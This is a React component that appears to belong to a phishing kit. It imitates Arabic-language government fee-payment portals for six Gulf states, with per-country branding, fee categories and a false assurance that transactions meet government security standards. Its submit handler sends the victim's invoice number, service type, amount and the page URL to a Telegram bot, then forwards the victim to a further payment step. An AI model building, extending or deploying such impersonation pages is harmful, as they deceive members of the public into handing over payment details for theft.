import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { ArrowLeft, Building2, FileText, CreditCard } from "lucide-react";
import { getCountryByCode } from "@/lib/countries";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";

const governmentPaymentTypes = {
  SA: [
    "مدفوعات حكومية عامة",
    "مدفوعات الديوان الملكي",
    "مدفوعات التأمينات الاجتماعية",
    "رسوم الجوازات والهجرة",
    "رسوم مكتب العمل",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم نقل الكفالة",
    "رسوم تغيير المهنة",
    "رسوم وزارة التجارة",
    "رسوم وزارة الصحة",
    "رسوم وزارة التعليم",
    "رسوم البلديات",
    "رسوم هيئة الزكاة والضريبة",
    "رسوم الخدمات القضائية",
    "مدفوعات أخرى"
  ],
  AE: [
    "مدفوعات حكومية",
    "مدفوعات ديوان ملكي",
    "مدفوعات تأمينات اجتماعية",
    "مدفوعات الزراعة والبيئة",
    "مدفوعات الجوازات",
    "مدفوعات مخالفات مكتب العمل",
    "رسوم مركبات",
    "رسوم نقل كفالة",
    "رسوم تغيير مهنة",
    "دفع رسوم تأييد رعاة",
    "رسوم تمكين",
    "مدفوعات مخالفات مرورية",
    "استرداد أموال",
    "مدفوعات أخرى"
  ],
  KW: [
    "مدفوعات حكومية عامة",
    "رسوم الإقامة والجنسية",
    "رسوم الجوازات",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة التجارة",
    "رسوم الهيئة العامة للقوى العاملة",
    "رسوم البلديات",
    "رسوم وزارة الصحة",
    "رسوم وزارة التربية",
    "رسوم المحاكم",
    "رسوم الخدمات الإلكترونية",
    "مدفوعات أخرى"
  ],
  BH: [
    "مدفوعات حكومية",
    "رسوم هيئة تنظيم سوق العمل",
    "رسوم الجوازات والجنسية",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة الصناعة والتجارة",
    "رسوم البلديات",
    "رسوم وزارة الصحة",
    "رسوم وزارة التربية والتعليم",
    "رسوم الخدمات القضائية",
    "رسوم الخدمات الإلكترونية",
    "مدفوعات أخرى"
  ],
  OM: [
    "مدفوعات حكومية عامة",
    "رسوم شرطة عمان السلطانية",
    "رسوم الإقامة",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة التجارة والصناعة",
    "رسوم وزارة القوى العاملة",
    "رسوم البلديات",
    "رسوم وزارة الصحة",
    "رسوم وزارة التربية والتعليم",
    "رسوم الخدمات القضائية",
    "مدفوعات أخرى"
  ],
  QA: [
    "مدفوعات حكومية",
    "رسوم وزارة الداخلية",
    "رسوم الإقامة والجوازات",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة التجارة والصناعة",
    "رسوم وزارة العمل",
    "رسوم البلديات",
    "رسوم هيئة المنطقة الحرة",
    "رسوم وزارة الصحة العامة",
    "رسوم وزارة التعليم والتعليم العالي",
    "مدفوعات أخرى"
  ]
};

const GovernmentPayment = () => {
  const { id, country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [paymentType, setPaymentType] = useState("");
  const [amount, setAmount] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const countryCode = country || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  const paymentTypes = governmentPaymentTypes[countryCode] || governmentPaymentTypes.SA;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const updatedData = {
        ...linkData?.payload,
        government_payment: {
          invoice_number: invoiceNumber,
          payment_type: paymentType,
          amount: parseFloat(amount),
          country: countryCode
        },
        payment_amount: parseFloat(amount)
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: `حكومة - ${paymentType}`,
          invoice: invoiceNumber,
          amount: `${amount} ${countryData?.currency || 'SAR'}`,
          country: countryData?.nameAr,
          payment_url: window.location.href
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/recipient`);
    } catch (error) {
      toast({
        title: "خطأ في معالجة الطلب",
        description: "حدث خطأ أثناء معالجة طلب الدفع. يرجى المحاولة مرة أخرى.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <div
        className="relative w-full h-48 sm:h-64 overflow-hidden"
        style={{
          background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
        }}
      >
        <div className="absolute inset-0 bg-black/30" />
        <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
          <div className="flex items-center gap-3">
            <Building2 className="w-12 h-12" />
            <div className="text-right">
              <h2 className="text-lg sm:text-2xl font-bold mb-1">
                الخدمات الحكومية
              </h2>
              <p className="text-xs sm:text-sm opacity-90">{countryData?.nameAr}</p>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
            <form onSubmit={handleSubmit}>
              <div className="flex items-center justify-between mb-6 sm:mb-8">
                <h1 className="text-xl sm:text-3xl font-bold">إتمام عملية السداد</h1>
                <div
                  className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                  style={{
                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
                  }}
                >
                  <FileText className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                </div>
              </div>

              <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                <div>
                  <Label htmlFor="invoice" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                    <FileText className="w-3 h-3 sm:w-4 sm:h-4" />
                    رقم الفاتورة أو المعاملة *
                  </Label>
                  <Input
                    id="invoice"
                    value={invoiceNumber}
                    onChange={(e) => setInvoiceNumber(e.target.value)}
                    required
                    className="h-10 sm:h-12 text-sm sm:text-base"
                    placeholder="أدخل رقم الفاتورة أو المعاملة"
                  />
                </div>

                <div>
                  <Label className="mb-2 text-sm">نوع الخدمة الحكومية *</Label>
                  <Select value={paymentType} onValueChange={setPaymentType}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر نوع الخدمة" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {paymentTypes.map((type) => (
                        <SelectItem key={type} value={type}>
                          {type}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <Label htmlFor="amount" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                    <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
                    قيمة الرسوم ({countryData?.currency}) *
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    required
                    className="h-10 sm:h-12 text-sm sm:text-base"
                    placeholder="أدخل المبلغ المطلوب"
                    step="0.01"
                    min="1"
                  />
                </div>
              </div>

              <Button
                type="submit"
                size="lg"
                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                style={{
                  background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
                }}
                disabled={!invoiceNumber || !paymentType || !amount || isSubmitting}
              >
                <span className="ml-2">
                  {isSubmitting ? "جاري المعالجة..." : "المتابعة والإكمال"}
                </span>
                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
              </Button>

              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                جميع المعاملات آمنة ومحمية ومتوافقة مع معايير الأمان الحكومية
              </p>
            </form>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default GovernmentPayment;
